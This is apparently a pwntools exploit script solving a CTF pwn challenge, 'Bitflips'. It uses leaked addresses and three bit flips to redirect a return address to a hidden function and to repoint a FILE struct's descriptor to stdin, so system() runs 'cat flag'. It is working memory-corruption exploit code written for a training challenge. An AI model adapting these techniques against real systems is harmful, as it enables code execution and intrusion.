#!/usr/bin/env python3
"""
Bitflips CTF Challenge Exploit
==============================

Binary analysis:
- setup(): opens ./commands file, stores FILE* in global `f` (@ PIE+0x4050)
- vuln(): leaks &main, &system, stack addr, sbrk(NULL), then calls bit_flip() 3 times
- bit_flip(): reads address (hex) + bit position (0-7), flips that bit at the address
- cmd() @ PIE+0x1429: hidden win function that reads lines from `f` and calls system() on each

Exploit strategy (3 bit flips):
  Flip 1: Change vuln return addr from PIE+0x1422 to PIE+0x142a (cmd+1) — bit 3 of low byte
  Flip 2: Change FILE struct _fileno from 3 to 2 — flip bit 0 at sbrk(NULL)-0x20cf0
  Flip 3: Change FILE struct _fileno from 2 to 0 — flip bit 1 at sbrk(NULL)-0x20cf0

  Result: cmd() reads from fd 0 (stdin) instead of the commands file.
          We send "cat flag" to get the flag.
"""

from pwn import *

context.binary = elf = ELF("./main")
libc = ELF("./libc.so.6")

HOST = "chall.0xfun.org"
PORT = 32863

# Offset from sbrk(NULL) to FILE struct's _fileno field
# Determined empirically: FILE* = sbrk(NULL) - 0x20d60, _fileno at FILE+0x70
FILENO_OFFSET = 0x20CF0


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([elf.path])


def do_flip(io, addr, bit):
    """Send one bit flip: address (hex) + bit position (decimal)"""
    io.recvuntil(b"> ")
    io.sendline(f"{addr:x}".encode())
    io.sendline(str(bit).encode())


def main():
    io = conn()

    # Receive the banner
    io.recvuntil(b"I'm feeling super generous today\n")

    # Parse leaks
    io.recvuntil(b"&main = ")
    main_leak = int(io.recvline().strip(), 16)
    pie_base = main_leak - elf.symbols["main"]
    log.info(f"PIE base: {hex(pie_base)}")

    io.recvuntil(b"&system = ")
    system_leak = int(io.recvline().strip(), 16)
    libc_base = system_leak - libc.symbols["system"]
    log.info(f"libc base: {hex(libc_base)}")

    io.recvuntil(b"&address = ")
    stack_leak = int(io.recvline().strip(), 16)
    log.info(f"stack leak (&address): {hex(stack_leak)}")

    io.recvuntil(b"sbrk(NULL) = ")
    sbrk_leak = int(io.recvline().strip(), 16)
    log.info(f"sbrk(NULL): {hex(sbrk_leak)}")

    # Compute target addresses
    ret_addr_location = stack_leak + 0x18
    fileno_addr = sbrk_leak - FILENO_OFFSET

    log.info(f"vuln return addr @ {hex(ret_addr_location)}")
    log.info(f"cmd+1 target: {hex(pie_base + 0x142a)}")
    log.info(f"_fileno @ {hex(fileno_addr)}")

    # Flip 1: redirect vuln return to cmd+1 (skip push rbp)
    #   0x22 ^ 0x08 = 0x2a  (bit 3)
    do_flip(io, ret_addr_location, 3)

    # Flip 2: change _fileno bit 0: fd 3 (0b11) -> 2 (0b10)
    do_flip(io, fileno_addr, 0)

    # Flip 3: change _fileno bit 1: fd 2 (0b10) -> 0 (0b00) = stdin
    do_flip(io, fileno_addr, 1)

    log.success("Bit flips sent! cmd() will now read from stdin")

    # cmd() loops: fgets(buf, 0x18, f) then system(buf)
    # Send our command — cat the flag
    sleep(0.5)
    io.sendline(b"cat flag")

    io.interactive()


if __name__ == "__main__":
    main()
